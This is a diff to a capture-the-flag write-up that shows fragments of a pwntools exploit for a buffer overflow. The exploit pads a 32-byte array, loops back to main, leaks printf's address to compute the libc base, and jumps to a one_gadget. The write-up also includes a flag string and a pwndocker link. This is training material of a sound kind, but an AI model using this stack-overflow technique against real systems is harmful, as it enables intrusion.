@@ -119,7 +119,7 @@ Here's what we need to do:
 2. Leak address of `printf`
 3. Redirect program to jump to our one_gadget
 
-We'll do this using pwntools. The full code can be found in `solve.py`, but here are the important parts.
+We'll do this using pwntools. The full solution can be found in `solve.py`, but here are the important parts.
 
 ```python
 loop_payload = b'a' * 32       # Pad char[32] array
@@ -127,6 +127,9 @@ loop_payload += p64(0x0)       # Filler rbp value
 loop_payload += p64(main_addr) # Loop back to start of main
 
 # some code to parse printf
+
+libc_base = printf_addr - libc.symbols['printf']
+one_gadget = libc_base + 0x4484f
 
 payload = b'a' * 32
 payload += p64(0x0)
@@ -160,5 +163,5 @@ flag{rob-is-proud-of-me-for-exploring-the-unknown-but-i-still-cant-afford-housin
 
 If a libc library is provided, be sure to patch your binary! This will help save a lot of pain when running locally vs externally.
 
-I... haven't figured out how to do this yet so I'll just leave a link here and maybe update this next time. `¯\_(ツ)_/¯ `
+I... haven't figured out how to do this yet so I'll just leave a [link](https://github.com/skysider/pwndocker) here and maybe update this next time. ¯\\_(ツ)_/¯
 
